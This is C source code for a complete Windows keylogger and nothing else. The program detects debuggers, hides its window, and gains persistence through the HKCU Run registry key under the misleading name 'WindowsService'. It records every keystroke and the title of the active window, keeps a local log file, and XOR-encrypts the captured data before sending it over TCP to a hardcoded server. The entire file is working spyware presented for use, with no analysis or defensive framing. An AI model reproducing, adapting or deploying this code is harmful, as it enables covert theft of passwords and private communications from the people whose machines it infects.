#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <winreg.h>
#include <shlobj.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define SERVER_IP "192.168.1.72"
#define SERVER_PORT 8080
#define RECONNECT_DELAY 10000
#define SERVICE_NAME "WindowsService"
#define ENCRYPTION_KEY "S3cr3tK3y"
#define MAX_BUFFER 1024
#define LOG_FILE "keystrokes.log"

char keystroke_buffer[MAX_BUFFER * 10] = {0};
size_t buffer_position = 0;
char current_window[256] = {0};

void CheckDebugger() {
    if (IsDebuggerPresent()) {
        exit(1);
    }
    
    DWORD t1 = GetTickCount();
    Sleep(100);
    if ((GetTickCount() - t1) < 100) {
        exit(1);
    }
}

void HideConsoleWindow() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}

void xor_encrypt(char *data, int length) {
    int key_len = strlen(ENCRYPTION_KEY);
    for (int i = 0; i < length; i++) {
        data[i] ^= ENCRYPTION_KEY[i % key_len];
    }
}

SOCKET connect_to_server() {
    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) 
        return INVALID_SOCKET;

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        WSACleanup();
        return INVALID_SOCKET;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return INVALID_SOCKET;
    }
    return sock;
}

void get_timestamp(char* buffer, size_t size) {
    time_t now;
    time(&now);
    struct tm* tm_info = localtime(&now);
    strftime(buffer, size, "[%H:%M:%S]", tm_info);
}

void send_window_title(SOCKET sock) {
    char title[256] = {0};
    HWND foreground = GetForegroundWindow();

    if (foreground && GetWindowText(foreground, title, sizeof(title))) {
        if (strcmp(current_window, title) != 0) {
            char buffer[512];
            char timestamp[32];
            get_timestamp(timestamp, sizeof(timestamp));
            int len = sprintf(buffer, "\n%s [Window: %s]\n", timestamp, title);
            
            xor_encrypt(buffer, len);
            send(sock, buffer, len, 0);
            
            strcpy(current_window, title);
        }
    }
}

void install_persistence() {
    char path[MAX_PATH];
    if (GetModuleFileName(NULL, path, MAX_PATH)) {
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, 
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueEx(hKey, SERVICE_NAME, 0, REG_SZ, (BYTE*)path, strlen(path)+1);
            RegCloseKey(hKey);
        }
    }
}

void write_to_logfile(const char* data) {
    FILE* file = fopen(LOG_FILE, "a");
    if (file) {
        fputs(data, file);
        fclose(file);
    }
}

void save_to_buffer(const char *data) {
    size_t data_len = strlen(data);
    if (buffer_position + data_len < sizeof(keystroke_buffer)) {
        strcat(keystroke_buffer + buffer_position, data);
        buffer_position += data_len;
    }
    write_to_logfile(data);
}

void send_buffered_keystrokes(SOCKET sock) {
    if (buffer_position > 0) {
        xor_encrypt(keystroke_buffer, buffer_position);
        send(sock, keystroke_buffer, buffer_position, 0);
        memset(keystroke_buffer, 0, sizeof(keystroke_buffer));
        buffer_position = 0;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    CheckDebugger();
    HideConsoleWindow();
    SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
    install_persistence();

    SOCKET sock;
    static bool key_states[256] = {0};
    bool is_connected = false;
    DWORD last_connection_attempt = 0;

    while (1) {
        // Key logging
        for (int key = 8; key <= 190; key++) {
            if ((GetAsyncKeyState(key) & 0x8000) && !key_states[key]) {
                char key_str[20] = {0};

                if (key >= 65 && key <= 90) {
                    sprintf(key_str, "%c", key + 32);
                } else if (key >= 48 && key <= 57) {
                    sprintf(key_str, "%c", key);
                } else {
                    switch (key) {
                        case VK_SPACE: strcpy(key_str, " "); break;
                        case VK_RETURN: strcpy(key_str, "[ENTER]\n"); break;
                        case VK_TAB: strcpy(key_str, "[TAB]"); break;
                        case VK_SHIFT: strcpy(key_str, "[SHIFT]"); break;
                        case VK_BACK: strcpy(key_str, "\b"); break;
                        case VK_ESCAPE: strcpy(key_str, "[ESC]"); break;
                        case VK_CONTROL: strcpy(key_str, "[CTRL]"); break;
                        case VK_LWIN: case VK_RWIN: strcpy(key_str, "[WIN]"); break;
                        case VK_MENU: strcpy(key_str, "[ALT]"); break;
                        case VK_CAPITAL: strcpy(key_str, "[CAPSLOCK]"); break;
                        case VK_DELETE: strcpy(key_str, "[DELETE]"); break;
                        case VK_INSERT: strcpy(key_str, "[INSERT]"); break;
                        case VK_HOME: strcpy(key_str, "[HOME]"); break;
                        case VK_END: strcpy(key_str, "[END]"); break;
                        case VK_LEFT: strcpy(key_str, "[LEFT]"); break;
                        case VK_RIGHT: strcpy(key_str, "[RIGHT]"); break;
                        case VK_UP: strcpy(key_str, "[UP]"); break;
                        case VK_DOWN: strcpy(key_str, "[DOWN]"); break;
                        case VK_OEM_1: strcpy(key_str, ";"); break;
                        case VK_OEM_7: strcpy(key_str, "'"); break;
                        case VK_OEM_COMMA: strcpy(key_str, ","); break;
                        case VK_OEM_PERIOD: strcpy(key_str, "."); break;
                        case VK_OEM_MINUS: strcpy(key_str, "-"); break;
                        case VK_OEM_PLUS: strcpy(key_str, "+"); break;
                        case VK_OEM_2: strcpy(key_str, "/"); break;
                        case VK_OEM_3: strcpy(key_str, "`"); break;
                        case VK_OEM_4: strcpy(key_str, "["); break;
                        case VK_OEM_5: strcpy(key_str, "\\"); break;
                        case VK_OEM_6: strcpy(key_str, "]"); break;
                        default: continue;
                    }
                }

                save_to_buffer(key_str);
                
                if (is_connected) {
                    int len = strlen(key_str);
                    xor_encrypt(key_str, len);
                    if (send(sock, key_str, len, 0) == SOCKET_ERROR) {
                        closesocket(sock);
                        WSACleanup();
                        is_connected = false;
                    }
                }

                key_states[key] = true;
            }
            
            if (!(GetAsyncKeyState(key) & 0x8000)) {
                key_states[key] = false;
            }
        }

        // Connection management
        DWORD now = GetTickCount();
        if (!is_connected && (now - last_connection_attempt > RECONNECT_DELAY)) {
            sock = connect_to_server();
            if (sock != INVALID_SOCKET) {
                is_connected = true;
                send_buffered_keystrokes(sock);
                send_window_title(sock);
            }
            last_connection_attempt = now;
        }
        else if (is_connected) {
            send_window_title(sock);
        }

        Sleep(10);
    }
    return 0;
}